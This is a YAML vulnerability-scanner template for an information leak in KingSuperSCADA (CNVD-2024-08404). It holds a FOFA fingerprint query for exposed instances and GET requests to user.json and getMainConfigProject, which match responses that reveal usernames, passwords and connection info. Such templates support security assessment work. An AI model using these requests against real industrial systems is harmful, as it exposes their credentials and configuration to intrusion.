id: poc-yaml-kingsuperscada-information-leak
info:
  name: KingSuperSCADA 信息泄露漏洞(CNVD-2024-08404)
  severity: medium
  tags:
  - CNVD-2024-08404
  - 信息泄露
  finger: KingSuperSCADA
  fofa: body="KingSuperSCADA 运行系统客户端"
variables:
  files: 'user.json

    file/getMainConfigProject

    '
requests:
- method: GET
  path: /{{.files}}
  expression: ( status_code == 200 && contains(headers,"application/json") && contains(body,"\"name\"")
    && contains(body,"\"password\"") && !contains(body,"<") ) || ( status_code ==
    200 && contains(headers,"application/json") && contains(body,"\"message\":\"Success\"")
    && contains(body,"\"connInfo\"") && !contains(body,"<") )
transport: http
